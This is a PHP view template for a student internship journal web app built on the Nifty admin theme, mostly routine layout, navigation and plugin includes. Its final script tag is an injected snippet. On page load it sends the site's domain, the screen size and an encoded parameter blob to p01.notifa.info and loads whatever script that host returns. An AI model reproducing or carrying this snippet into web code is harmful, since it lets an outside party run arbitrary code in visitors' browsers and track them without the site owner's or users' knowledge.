<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from www.themeon.net/nifty/v2.9.1/gallery-grid.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:11:28 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Hummagang</title>


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->

    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url(); ?>assets/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url(); ?>assets/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo.min.css" rel="stylesheet">

    <!--Ion Icons [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">

    <!--Morris.js [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/morris-js/morris.min.css" rel="stylesheet">

    <!--Ion Icons [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">

    <!--Themify Icons [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/themify-icons/themify-icons.min.css" rel="stylesheet">

    <!--Font Awesome [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">

    <!--FooTable [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/fooTable/css/footable.core.css" rel="stylesheet">

    <!--Switchery [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/switchery/switchery.min.css" rel="stylesheet">


    <!--Bootstrap Select [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-select/bootstrap-select.min.css" rel="stylesheet">

    <!--sweetalert-->
    <link href="<?php echo base_url(); ?>assets/sweetalert/sweetalert.css" rel="stylesheet">

    <!--Bootstrap Tags Input [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-tagsinput/bootstrap-tagsinput.min.css" rel="stylesheet">


    <!--Chosen [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/chosen/chosen.min.css" rel="stylesheet">


    <!--noUiSlider [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/noUiSlider/nouislider.min.css" rel="stylesheet">


    <!--Select2 [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/select2/css/select2.min.css" rel="stylesheet">


    <!--Bootstrap Timepicker [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-timepicker/bootstrap-timepicker.min.css" rel="stylesheet">


    <!--Bootstrap Datepicker [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet">

    <!--Unite Gallery [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/unitegallery/css/unitegallery.min.css" rel="stylesheet">

    <!--Dropzone [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.css" rel="stylesheet">

    <!--DataTables [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
    <link href="<?php echo base_url(); ?>assets/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.3.1/dist/leaflet.css" />
<script src="https://unpkg.com/leaflet@1.3.1/dist/leaflet.js"></script>
<style type="text/css">
html, body { width:100%;padding:0;margin:0; }
.container { width:95%;max-width:980px;padding:1% 2%;margin:0 auto }
#lat, #lon { text-align:right }
#map { width:100%;height:50%;padding:0;margin:0; }
.address { cursor:pointer }
.address:hover { color:#AA0000;text-decoration:underline }
</style>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"
    integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A=="
    crossorigin=""/>
  <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"
    integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA=="
    crossorigin=""></script>

  <!-- Load Esri Leaflet from CDN -->
  <script src="https://unpkg.com/esri-leaflet@3.0.1/dist/esri-leaflet.js"
    integrity="sha512-JmpptMCcCg+Rd6x0Dbg6w+mmyzs1M7chHCd9W8HPovnImG2nLAQWn3yltwxXRM7WjKKFFHOAKjjF2SC4CgiFBg=="
    crossorigin=""></script>

  <!-- Load Esri Leaflet Geocoder from CDN -->
  <link rel="stylesheet" href="https://unpkg.com/esri-leaflet-geocoder@3.0.0/dist/esri-leaflet-geocoder.css"
    integrity="sha512-IM3Hs+feyi40yZhDH6kV8vQMg4Fh20s9OzInIIAc4nx7aMYMfo+IenRUekoYsHZqGkREUgx0VvlEsgm7nCDW9g=="
    crossorigin="">
  <script src="https://unpkg.com/esri-leaflet-geocoder@3.0.0/dist/esri-leaflet-geocoder.js"
    integrity="sha512-vZbMwAf1/rpBExyV27ey3zAEwxelsO4Nf+mfT7s6VTJPUbYmD2KSuTRXTxOFhIYqhajaBU+X5PuFK1QJ1U9Myg=="
    crossorigin=""></script>




    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>

    <div id="container" class="effect aside-float aside-bright mainnav-lg">


        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url(); ?>assets/login/pages/img/login/c.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span style="margin-left: 10px" class="brand-text">Prakerin</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->





                    </ul>
                    <ul class="nav navbar-top-links">










                        <!--User dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li id="dropdown-user" class="dropdown">
                            <a href="#" data-toggle="dropdown" class="dropdown-toggle text-right">
                                <span class="ic-user pull-right">
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <!--You can use an image instead of an icon.-->
                                    <!--<img class="img-circle img-user media-object" src="img/profile-photos/1.png" alt="Profile Picture">-->
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <i class="demo-pli-male"></i>
                                </span>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--You can also display a user name in the navbar.-->
                                <!--<div class="username hidden-xs">Aaron Chavez</div>-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            </a>


                            <div class="dropdown-menu dropdown-menu-sm dropdown-menu-right panel-default">
                                <ul class="head-list">

                                    <li>
                                        <a href="<?php echo base_url('login/logoutApp') ?>"><i class="demo-pli-unlock icon-lg icon-fw"></i> Logout</a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End user dropdown-->



                    </ul>
                </div>
                <!--================================-->
                <!--End Navbar Dropdown-->

            </div>
        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">


                <!--Page content-->
                <!--===================================================-->
                <div id="page-content">

                    <?php
                    $this->load->view($namamodule .'/'.$namafileview);
                    ?>

                </div>
                <!--===================================================-->
                <!--End page content-->

            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->



            <!--ASIDE-->
            <!--===================================================-->
            <aside id="aside-container">
                <div id="aside">
                    <div class="nano">
                        <div class="nano-content">

                            <!--Nav tabs-->
                            <!--================================-->
                            <ul class="nav nav-tabs nav-justified">
                                <li class="active">
                                    <a href="#demo-asd-tab-1" data-toggle="tab">
                                        <i class="demo-pli-speech-bubble-7 icon-lg"></i>
                                    </a>
                                </li>
                                <li>
                                    <a href="#demo-asd-tab-2" data-toggle="tab">
                                        <i class="demo-pli-information icon-lg icon-fw"></i> Report
                                    </a>
                                </li>
                                <li>
                                    <a href="#demo-asd-tab-3" data-toggle="tab">
                                        <i class="demo-pli-wrench icon-lg icon-fw"></i> Settings
                                    </a>
                                </li>
                            </ul>
                            <!--================================-->
                            <!--End nav tabs-->



                            <!-- Tabs Content -->
                            <!--================================-->
                            <div class="tab-content">



                                <!--Second tab (Custom layout)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <div class="tab-pane fade" id="demo-asd-tab-2">

                                    <!--Monthly billing-->
                                    <div class="pad-all">
                                        <p class="pad-ver text-main text-sm text-uppercase text-bold">Billing &amp; reports</p>
                                        <p>Get <strong class="text-main">$5.00</strong> off your next bill by making sure your full payment reaches us before August 5, 2018.</p>
                                    </div>
                                    <hr class="new-section-xs">
                                    <div class="pad-all">
                                        <span class="pad-ver text-main text-sm text-uppercase text-bold">Amount Due On</span>
                                        <p class="text-sm">August 17, 2018</p>
                                        <p class="text-2x text-thin text-main">$83.09</p>
                                        <button class="btn btn-block btn-success mar-top">Pay Now</button>
                                    </div>


                                    <hr>

                                    <p class="pad-all text-main text-sm text-uppercase text-bold">Additional Actions</p>

                                    <!--Simple Menu-->
                                    <div class="list-group bg-trans">
                                        <a href="#" class="list-group-item"><i class="demo-pli-information icon-lg icon-fw"></i> Service Information</a>
                                        <a href="#" class="list-group-item"><i class="demo-pli-mine icon-lg icon-fw"></i> Usage Profile</a>
                                        <a href="#" class="list-group-item"><span class="label label-info pull-right">New</span><i class="demo-pli-credit-card-2 icon-lg icon-fw"></i> Payment Options</a>
                                        <a href="#" class="list-group-item"><i class="demo-pli-support icon-lg icon-fw"></i> Message Center</a>
                                    </div>


                                    <hr>

                                    <div class="text-center">
                                        <div><i class="demo-pli-old-telephone icon-3x"></i></div>
                                        Questions?
                                        <p class="text-lg text-semibold text-main"> (415) 234-53454 </p>
                                        <small><em>We are here 24/7</em></small>
                                    </div>
                                </div>
                                <!--End second tab (Custom layout)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


                                <!--Third tab (Settings)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <div class="tab-pane fade" id="demo-asd-tab-3">
                                    <ul class="list-group bg-trans">
                                        <li class="pad-top list-header">
                                            <p class="text-main text-sm text-uppercase text-bold mar-no">Account Settings</p>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-1" type="checkbox" checked>
                                                <label for="demo-switch-1"></label>
                                            </div>
                                            <p class="mar-no text-main">Show my personal status</p>
                                            <small class="text-muted">Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</small>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-2" type="checkbox" checked>
                                                <label for="demo-switch-2"></label>
                                            </div>
                                            <p class="mar-no text-main">Show offline contact</p>
                                            <small class="text-muted">Aenean commodo ligula eget dolor. Aenean massa.</small>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-3" type="checkbox">
                                                <label for="demo-switch-3"></label>
                                            </div>
                                            <p class="mar-no text-main">Invisible mode </p>
                                            <small class="text-muted">Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. </small>
                                        </li>
                                    </ul>


                                    <hr>

                                    <ul class="list-group pad-btm bg-trans">
                                        <li class="list-header"><p class="text-main text-sm text-uppercase text-bold mar-no">Public Settings</p></li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-4" type="checkbox" checked>
                                                <label for="demo-switch-4"></label>
                                            </div>
                                            Online status
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-5" type="checkbox" checked>
                                                <label for="demo-switch-5"></label>
                                            </div>
                                            Show offline contact
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-6" type="checkbox" checked>
                                                <label for="demo-switch-6"></label>
                                            </div>
                                            Show my device icon
                                        </li>
                                    </ul>



                                    <hr>

                                    <p class="pad-hor text-main text-sm text-uppercase text-bold mar-no">Task Progress</p>
                                    <div class="pad-all">
                                        <p class="text-main">Upgrade Progress</p>
                                        <div class="progress progress-sm">
                                            <div class="progress-bar progress-bar-success" style="width: 15%;"><span class="sr-only">15%</span></div>
                                        </div>
                                        <small>15% Completed</small>
                                    </div>
                                    <div class="pad-hor">
                                        <p class="text-main">Database</p>
                                        <div class="progress progress-sm">
                                            <div class="progress-bar progress-bar-danger" style="width: 75%;"><span class="sr-only">75%</span></div>
                                        </div>
                                        <small>17/23 Database</small>
                                    </div>

                                </div>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--Third tab (Settings)-->

                            </div>
                        </div>
                    </div>
                </div>
            </aside>
            <!--===================================================-->
            <!--END ASIDE-->


            <!--MAIN NAVIGATION-->
            <!--===================================================-->
            <nav id="mainnav-container">
                <div id="mainnav">


                    <!--OPTIONAL : ADD YOUR LOGO TO THE NAVIGATION-->
                    <!--It will only appear on small screen devices.-->
                    <!--================================
                    <div class="mainnav-brand">
                        <a href="index.html" class="brand">
                            <img src="img/logo.png" alt="Nifty Logo" class="brand-icon">
                            <span class="brand-text">Nifty</span>
                        </a>
                        <a href="#" class="mainnav-toggle"><i class="pci-cross pci-circle icon-lg"></i></a>
                    </div>
                -->



                <!--Menu-->
                <!--================================-->
                <div id="mainnav-menu-wrap">
                    <div class="nano">
                        <div class="nano-content">

                            <!--Profile Widget-->
                            <!--================================-->
                            <div id="mainnav-profile" class="mainnav-profile">


                               <div class="profile-wrap text-center">
                                <div class="pad-btm">
                                    <a href="">
                                        <img class="img-circle img-md" src="<?php echo base_url ()?>assets/img/<?php echo $nama['logo']?>" alt="Profile Picture">
                                    </a>
                                </div>
                                <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                    <span class="pull-right dropdown-toggle">
                                        <i class="dropdown-caret"></i>
                                    </span>
                                    <p class="text-center mnp-name"><?php echo $nama['nama_siswa'] ; ?></p>
                                    <span class="text-center mnp-desc"><?php echo $email['nisn']; ?></span>
                                </a>
                            </div>


                            <div id="profile-nav" class="collapse list-group bg-trans">



                              

                                <a href="<?php echo base_url('siswa_pengaturan'); ?>" class="list-group-item">
                                    <i class="demo-pli-unlock icon-lg icon-fw"></i> Pengaturan
                                </a>
                                
                                <a href="<?php echo base_url('login/logoutApp'); ?>" class="list-group-item">
                                    <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
                                </a>                            

                            </div>
                        </div>


                        <!--Shortcut buttons-->
                        <!--================================-->
                        <div id="mainnav-shortcut" class="hidden">
                            <ul class="list-unstyled shortcut-wrap">
                                <li class="col-xs-3" data-content="My Profile">
                                    <a class="shortcut-grid" href="#">
                                        <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
                                            <i class="demo-pli-male"></i>
                                        </div>
                                    </a>
                                </li>
                                <li class="col-xs-3" data-content="Messages">
                                    <a class="shortcut-grid" href="#">
                                        <div class="icon-wrap icon-wrap-sm icon-circle bg-warning">
                                            <i class="demo-pli-speech-bubble-3"></i>
                                        </div>
                                    </a>
                                </li>
                                <li class="col-xs-3" data-content="Activity">
                                    <a class="shortcut-grid" href="#">
                                        <div class="icon-wrap icon-wrap-sm icon-circle bg-success">
                                            <i class="demo-pli-thunder"></i>
                                        </div>
                                    </a>
                                </li>
                                <li class="col-xs-3" data-content="Lock Screen">
                                    <a class="shortcut-grid" href="#">
                                        <div class="icon-wrap icon-wrap-sm icon-circle bg-purple">
                                            <i class="demo-pli-lock-2"></i>
                                        </div>
                                    </a>
                                </li>
                            </ul>
                        </div>
                        <!--================================-->
                        <!--End shortcut buttons-->




                        <ul id="mainnav-menu" class="list-group">
                            <?php if($this->uri->segment('1') == 'siswa_dashboard'){ ?>
                                <li class="active-sub">
                                    <a href="<?php echo base_url('siswa_dashboard'); ?>">
                                        <i >
                                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-house" viewBox="0 0 16 16">
                                              <path fill-rule="evenodd" d="M2 13.5V7h1v6.5a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5V7h1v6.5a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 13.5zm11-11V6l-2-2V2.5a.5.5 0 0 1 .5-.5h1a.5.5 0 0 1 .5.5z"/>
                                              <path fill-rule="evenodd" d="M7.293 1.5a1 1 0 0 1 1.414 0l6.647 6.646a.5.5 0 0 1-.708.708L8 2.207 1.354 8.854a.5.5 0 1 1-.708-.708L7.293 1.5z"/>
                                          </svg>
                                      </i>
                                      <span class="menu-title">dashboard</span>
                                  </a>
                                  <!--Submenu-->
                              </li>
                          <?php } else{ ?>



                            <li>
                                <a href="<?php echo base_url('siswa_dashboard'); ?>">
                                    <i >
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-house" viewBox="0 0 16 16">
                                          <path fill-rule="evenodd" d="M2 13.5V7h1v6.5a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5V7h1v6.5a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 13.5zm11-11V6l-2-2V2.5a.5.5 0 0 1 .5-.5h1a.5.5 0 0 1 .5.5z"/>
                                          <path fill-rule="evenodd" d="M7.293 1.5a1 1 0 0 1 1.414 0l6.647 6.646a.5.5 0 0 1-.708.708L8 2.207 1.354 8.854a.5.5 0 1 1-.708-.708L7.293 1.5z"/>
                                      </svg>
                                  </i>
                                  <span class="menu-title">dashboard</span>
                              </a>
                              <!--Submenu-->
                          </li>
                      <?php } ?>

                      <li class=" <?=$this->uri->segment('1') == 'siswa_jurnal' || $this->uri->segment(1) == 'siswa_cetak' ? "active-sub" : ''?>">
                        <a href="">
                          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard-data" viewBox="0 0 16 16">
                              <path d="M4 11a1 1 0 1 1 2 0v1a1 1 0 1 1-2 0v-1zm6-4a1 1 0 1 1 2 0v5a1 1 0 1 1-2 0V7zM7 9a1 1 0 0 1 2 0v3a1 1 0 1 1-2 0V9z"/>
                              <path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/>
                              <path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/>
                          </svg>
                          <span class="menu-title" style="margin-left: 10px">Data</span>
                          <i class="arrow"></i>
                      </a>
                      <ul class="collapse">
                        <li <?=$this->uri->segment('1') == 'siswa_jurnal' ? 'class="active-link"' : ''?>><a href="<?php echo base_url('siswa_jurnal'); ?>">Data Jurnal</a></li>
                        <li <?=$this->uri->segment('1') == 'siswa_cetak' ? 'class="active-link"' : ''?>><a href="<?php echo base_url('siswa_cetak'); ?>">Cetak Jurnal</a></li>
                    </ul>
                </li>


                <?php if($this->uri->segment('1') == 'siswa_dudi'){ ?>
                    <li class="active-sub">
                        <a href="<?php echo base_url('siswa_dudi'); ?>">
                            <i class="fa fa-list"></i>
                            <span class="menu-title">Data Dudi</span>
                        </a>
                        <!--Submenu-->
                    </li>
                <?php } else{ ?>
                    <li>
                        <a href="<?php echo base_url('siswa_dudi'); ?>">
                            <i class="fa fa-list"></i>
                            <span class="menu-title">Data Dudi</span>
                        </a>
                        <!--Submenu-->
                    </li>
                <?php } ?>



            </ul>


            <!--Widget-->
            <!--================================-->

            <!--================================-->
            <!--End widget-->

        </div>
    </div>
</div>
<!--================================-->
<!--End menu-->

</div>
</nav>
<!--===================================================-->
<!--END MAIN NAVIGATION-->

</div>



<!-- FOOTER -->
<!--===================================================-->
<footer id="footer">

    <!-- Visible when footer positions are fixed -->
    <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
    <div class="show-fixed pad-rgt pull-right">
        You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
    </div>



    <!-- Visible when footer positions are static -->
    <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
    <div class="hide-fixed pull-right pad-rgt">
     Hummasoft Technologhy
 </div>



 <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
 <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
 <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->

 <p class="pad-lft">&#0169; 2019 HummaPOS</p>



</footer>
<!--===================================================-->
<!-- END FOOTER -->


<!-- SCROLL PAGE BUTTON -->
<!--===================================================-->
<button class="scroll-top btn">
    <i class="pci-chevron chevron-up"></i>
</button>
<!--===================================================-->
</div>
<!--===================================================-->
<!-- END OF CONTAINER -->





<!--JAVASCRIPT-->
<!--=================================================-->

<!--jQuery [ REQUIRED ]-->
<script src="<?php echo base_url(); ?>assets/js/jquery.min.js"></script>


<!--BootstrapJS [ RECOMMENDED ]-->
<script src="<?php echo base_url(); ?>assets/js/bootstrap.min.js"></script>


<!--NiftyJS [ RECOMMENDED ]-->
<script src="<?php echo base_url(); ?>assets/js/nifty.min.js"></script>




<!--=================================================-->

<!--Bootstrap Select [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/bootstrap-select/bootstrap-select.min.js"></script>

<!--FooTable [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/fooTable/dist/footable.all.min.js"></script>

<!--Chosen [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/chosen/chosen.jquery.min.js"></script>


<!--Bootstrap Tags Input [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/bootstrap-tagsinput/bootstrap-tagsinput.min.js"></script>


<!--noUiSlider [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/noUiSlider/nouislider.min.js"></script>

<!--sweetalert -->
<script src="<?php echo base_url(); ?>assets/sweetalert/sweetalert.min.js"></script>

<!--Select2 [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/select2/js/select2.min.js"></script>


<!--Bootstrap Timepicker [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/bootstrap-timepicker/bootstrap-timepicker.min.js"></script>

<!--Demo script [ DEMONSTRATION ]-->
<script src="<?php echo base_url(); ?>assets/js/demo/nifty-demo.min.js"></script>


<!--Unite Gallery [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/unitegallery/js/unitegallery.min.js"></script>
<script src="<?php echo base_url(); ?>assets/plugins/unitegallery/themes/tilesgrid/ug-theme-tilesgrid.js"></script>


<!--Bootstrap Datepicker [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>

<!--DataTables [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/jquery.dataTables.js"></script>
<script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
<script src="<?php echo base_url(); ?>assets/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>

<!--DataTables Sample [ SAMPLE ]-->
<script src="<?php echo base_url(); ?>assets/js/demo/tables-datatables.js"></script>

<!--Bootbox Modals [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/bootbox/bootbox.min.js"></script>

<!--Dropzone [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.js"></script>

<!--Form File Upload [ SAMPLE ]-->
<script src="<?php echo base_url(); ?>assets/js/demo/form-file-upload.js"></script>



<!--Custom script [ DEMONSTRATION ]-->
<!--===================================================-->
<script>
    $(document).on('nifty.ready', function () {

          // CHOSEN
          // =================================================================
          // Require Chosen
          // http://harvesthq.github.io/chosen/
          // =================================================================
          $('#penugasanabsj').chosen();
          $('#demo-cs-multiselect').chosen({width:'100%'});


          $("#demo-gallery").unitegallery({
            tile_enable_shadow: false
        });



          $("#demo-gallery-2").unitegallery({
            tile_enable_shadow: false,
            theme_navigation_type: "arrows"
        });


      });
  </script>



  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUWZGox9%2fkr1uHmXNbfFg7iJOq73iY3i9gjH9B8F6qFTmSGdnl0kBm3BNGJPd79CpSqmKdOldL4Lu50Hn49J2brJwmSxWfFx4YdGvcMgzTyfs6TV%2f9cEwJA1GnwM2lUY2KeR6Bj3EuJpywq4D5Xnnu%2bbXVIvSThIVQxX0k1aXe%2bGfDAY%2bpblkqIj39dPFBatFcNr7XTMOcYd6vHNeGC%2bi6qI%2f5pUQApaUb6CofqnO3p8lqtdTdsxBWHSjdX83R6JO%2fXHSrajuiBRB1%2b27pKFR4o%2bAwM%2fW4bbNHYLPvYs5U7c0PouWCZ7Zdgp1e0P%2bp0yzc3FJUvqkJEZIpq3UMkK%2bWsHyA4PYef8KQAkZOP%2fA2nXl7F7AsdBuQgqgQULGqYmIDEbW3UQyk%2f%2f1%2bFf4OIcyXEM1kWvmMf1Y8MiID9GVZzmmTDrmJ80xdJ7d2PIhnPueKVj2gRPzW8qw7288lLys5cJhFSvzLvPCbRC3VXXtTW%2bw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

  <!-- Mirrored from www.themeon.net/nifty/v2.9.1/gallery-grid.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:11:28 GMT -->
  </html>
